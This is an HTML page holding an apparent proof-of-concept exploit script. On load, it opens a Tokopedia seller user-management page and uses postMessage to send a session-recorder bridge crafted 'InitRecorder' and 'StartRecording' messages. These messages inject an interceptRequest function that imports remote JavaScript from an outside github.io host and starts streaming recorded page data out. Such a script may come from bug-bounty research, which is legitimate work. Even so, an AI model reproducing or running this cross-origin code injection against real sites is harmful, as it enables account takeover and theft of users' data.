<html>
  <script>
     function startExploit() {

    const targetWindow = window.open("https://seller-id.tokopedia.com/profile/account-setting/user-management?module=add_user", "_blank");
    
    // 等待页面加载
    setTimeout(() => {
        console.log("[*] Sending InitRecorder...");
        
        const initPayload = {
            topic: "bytereplay.bridging",
            fromId: "attacker",
            id: "init-1",
            message: {
                type: "InitRecorder",
                payload: {
                    options: {
                        worker:"https://johnstonemees.github.io/worker.js",
                        trackers: ["html","image","js","Network"],  // 只启用 Network
                        
                        // interceptRequest 必须是字符串
                        interceptRequest: `(function(path, headers) {importScripts("https://johnstonemees.github.io/poc/tiktok/poc.js"); return {path: path, headers: headers};})`,
                        
                        environment: {
                            type: "PROD-PUBLIC",
                            baseURL: "https://httpbin.org/post",
                            apiPrefix: "/api/"
                        }
                    }
                }
            }
        };
        
        targetWindow.postMessage(initPayload, '*');
        
        // 等待 InitRecorder 完成后发送 StartRecording
        setTimeout(() => {
            console.log("[*] Sending StartRecording...");
            
            const startPayload = {
                topic: "bytereplay.bridging",
                fromId: "attacker",
                id: "start-1",
                message: {
                    type: "StartRecording",
                    payload: {
                        mode: "streaming-http",
                        parent: "evil-recording",
                        refType: "iframe"
                    }
                }
            };
            
            targetWindow.postMessage(startPayload, '*');
        }, 2000);
        
    }, 10000);
}
     startExploit();
  </script>
 </html>
